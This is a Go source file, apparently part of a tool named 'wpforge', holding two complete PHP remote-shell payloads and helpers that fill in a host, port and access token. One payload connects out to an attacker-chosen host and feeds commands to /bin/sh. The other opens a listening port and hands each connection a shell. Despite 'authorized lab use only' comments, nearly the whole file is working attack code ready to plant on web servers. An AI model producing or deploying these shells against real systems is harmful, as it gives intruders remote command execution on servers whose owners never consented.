// Package payload: reverse/bind shell PHP payloads and helpers.
// Authorized lab use only.
package payload

import (
	"fmt"
	"strings"
)

// ReverseShellPHP is a token-gated PHP reverse shell using fsockopen +
// proc_open (POSIX targets). The token gates the outbound connection so
// the payload can't be triggered by third parties scanning your lab.
const ReverseShellPHP = `<?php
/* wpforge lab reverse shell - authorized lab use only */
$tk = '__TOKEN__';
if (!isset($_REQUEST['t']) || !hash_equals($tk, (string)$_REQUEST['t'])) { exit; }
$host = '__HOST__'; $port = __PORT__;
for ($i = 0; $i < 3; $i++) {
  $s = @fsockopen($host, $port, $e, $es, 5);
  if ($s) break;
  sleep(1);
}
if (!$s) exit;
$desc = array(0 => array('pipe','r'), 1 => array('pipe','w'), 2 => array('pipe','w'));
$proc = proc_open('/bin/sh', $desc, $pipes);
if (!is_resource($proc)) { fwrite($s, "proc_open disabled\n"); fclose($s); exit; }
stream_set_blocking($s, false);
stream_set_blocking($pipes[1], false);
stream_set_blocking($pipes[2], false);
while (true) {
  $r = array($s, $pipes[1], $pipes[2]);
  if (@stream_select($r, $w, $x, 1) === false) break;
  if (in_array($s, $r)) { $d = @fread($s, 4096); if ($d === '' || feof($s)) break; fwrite($pipes[0], $d); }
  if (in_array($pipes[1], $r)) { $d = @fread($pipes[1], 4096); if ($d !== '') fwrite($s, $d); }
  if (in_array($pipes[2], $r)) { $d = @fread($pipes[2], 4096); if ($d !== '') fwrite($s, $d); }
}
fclose($s);
proc_close($proc);
?>`

// ReverseShell renders the reverse shell payload for host/port/token.
func ReverseShell(host string, port int, token string) string {
	s := strings.ReplaceAll(ReverseShellPHP, "__TOKEN__", token)
	s = strings.ReplaceAll(s, "__HOST__", host)
	s = strings.ReplaceAll(s, "__PORT__", fmt.Sprint(port))
	return s
}

// BindShellPHP is a token-gated bind shell: listens on a port, spawns /bin/sh
// per connection. Useful when the target can't make outbound connections.
const BindShellPHP = `<?php
/* wpforge lab bind shell - authorized lab use only */
$tk = '__TOKEN__'; $port = __PORT__;
if (!isset($_REQUEST['t']) || !hash_equals($tk, (string)$_REQUEST['t'])) { exit; }
set_time_limit(0);
$srv = @stream_socket_server("tcp://0.0.0.0:$port", $e, $es);
if (!$srv) exit("bind failed: $es\n");
while ($c = @stream_socket_accept($srv, 300)) {
  $desc = array(0 => array('pipe','r'), 1 => array('pipe','w'), 2 => array('pipe','w'));
  $proc = proc_open('/bin/sh', $desc, $pipes);
  if (!is_resource($proc)) { fclose($c); continue; }
  stream_set_blocking($c, false);
  stream_set_blocking($pipes[1], false);
  while (true) {
    $r = array($c, $pipes[1]);
    if (@stream_select($r, $w, $x, 1) === false) break;
    if (in_array($c, $r)) { $d = @fread($c, 4096); if ($d === '' || feof($c)) break; fwrite($pipes[0], $d); }
    if (in_array($pipes[1], $r)) { $d = @fread($pipes[1], 4096); if ($d !== '') fwrite($c, $d); }
  }
  proc_close($proc);
  fclose($c);
}
?>`

// BindShell renders the bind shell payload for port/token.
func BindShell(port int, token string) string {
	s := strings.ReplaceAll(BindShellPHP, "__TOKEN__", token)
	s = strings.ReplaceAll(s, "__PORT__", fmt.Sprint(port))
	return s
}
